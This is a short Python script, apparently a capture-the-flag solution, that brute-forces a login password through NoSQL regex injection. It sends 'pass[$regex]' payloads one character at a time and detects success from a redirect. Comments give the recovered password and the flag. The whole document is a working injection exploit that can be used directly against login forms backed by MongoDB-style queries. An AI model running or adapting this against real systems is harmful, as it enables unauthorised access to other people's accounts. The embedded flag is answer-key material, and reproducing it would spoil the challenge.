import requests 
import string
pool='0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM{!}@#$'
url='http://<ip>/login.php'
found_pass=''

#pass is 10584312
# flag{N0Sql_n01iF3!}

while True:
	for ch in pool:
		tried_pass=found_pass+ch
		num=11-len(tried_pass) # this assumes password is 11 characters
		p1=f'{tried_pass}.'
		p2=f'{num}' 
		data={'user':'pedro','pass[$regex]':'^'+p1+'{'+p2+'}'+'$','remember':'on'}
		print(f'trying {data=}')
		r=requests.post(url,data=data,allow_redirects=False) # our correct condition is being redirected to /sekr3tPl4ce.php
		if r.headers['Location'] == '/sekr3tPl4ce.php':
			print(f'found {ch}')
			found_pass+=ch
			break
		if num==-1:
			break
	if num==-1:
			break
print(f'password is {found_pass=}')					

